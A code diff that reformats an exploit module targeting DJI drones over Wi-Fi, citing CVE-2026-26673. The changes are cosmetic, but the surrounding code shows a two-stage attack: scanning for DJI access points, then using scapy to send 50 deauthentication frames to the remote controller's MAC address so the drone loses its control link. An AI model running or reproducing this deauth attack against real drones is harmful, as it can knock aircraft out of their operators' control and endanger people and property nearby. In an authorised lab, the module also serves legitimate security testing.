@@ -38,11 +38,11 @@ Affected:
   Any DJI drone operating in Wi-Fi RC mode without 802.11w
 
 References:
-  - https://nvd.nist.gov/vuln/detail/CVE-2026-26673
+ - https://nvd.nist.gov/vuln/detail/CVE-2026-26673
 
 MITRE ATT&CK:
-  T1498    - Network Denial of Service
-  T1040    - Network Sniffing
+  T1498 - Network Denial of Service
+  T1040 - Network Sniffing
 
 Author: Andre Henrique (@mrhenrike) | Uniao Geek
 Version: 1.0.0
@@ -143,7 +143,7 @@ class Exploit(HTTPClient):
                 else:
                     print_warning("[Stage 1] No DJI APs found in range")
             except ImportError:
-                print_warning("[Stage 1] scapy not available — install scapy for active scan")
+                print_warning("[Stage 1] scapy not available - install scapy for active scan")
         else:
             print_info("[Stage 1] Set do_scan=True to scan for DJI APs (monitor mode required)")
 
@@ -152,7 +152,7 @@ class Exploit(HTTPClient):
             if not self.drone_bssid or not self.rc_mac:
                 print_error("[Stage 2] drone_bssid and rc_mac are required for deauth")
                 return
-            print_warning("[Stage 2] Sending deauth frames — AUTHORIZED LAB ONLY")
+            print_warning("[Stage 2] Sending deauth frames - AUTHORIZED LAB ONLY")
             try:
                 from scapy.all import Dot11, Dot11Deauth, RadioTap, conf, sendp
                 conf.iface = self.interface
@@ -166,9 +166,9 @@ class Exploit(HTTPClient):
                 )
                 print_status(f"[Stage 2] Sending 50 deauth frames to {self.rc_mac}")
                 sendp(frame, count=50, inter=0.1, verbose=False)
-                print_success("[Stage 2] Deauth frames sent — monitor drone for RC link loss")
+                print_success("[Stage 2] Deauth frames sent - monitor drone for RC link loss")
             except ImportError:
-                print_error("[Stage 2] scapy not available — install scapy for deauth")
+                print_error("[Stage 2] scapy not available - install scapy for deauth")
             except Exception as e:
                 print_error(f"[Stage 2] Deauth error: {e}")
         else:
